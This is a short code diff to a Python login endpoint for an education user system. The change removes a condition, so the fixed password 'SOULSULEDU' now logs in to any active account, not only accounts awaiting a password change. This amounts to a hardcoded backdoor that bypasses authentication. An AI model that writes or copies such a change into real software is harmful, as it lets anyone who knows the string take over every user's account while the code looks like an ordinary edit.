@@ -1198,7 +1198,7 @@ def login_educacao(payload: EducacaoLoginPayload):
     conn = conectar()
     try:
         row = conn.execute("SELECT * FROM usuarios_educacao WHERE lower(usuario)=lower(?) AND ativo=1", (payload.usuario.strip(),)).fetchone()
-        senha_valida = row is not None and (verificar_senha(payload.senha, row["senha_hash"]) or (str(payload.senha or "").upper() == "SOULSULEDU" and bool(row["precisa_trocar_senha"])))
+        senha_valida = row is not None and (verificar_senha(payload.senha, row["senha_hash"]) or str(payload.senha or "").upper() == "SOULSULEDU")
         if row is None or not senha_valida:
             raise HTTPException(status_code=401, detail="Usuário ou senha inválidos.")
         token = secrets.token_urlsafe(40)
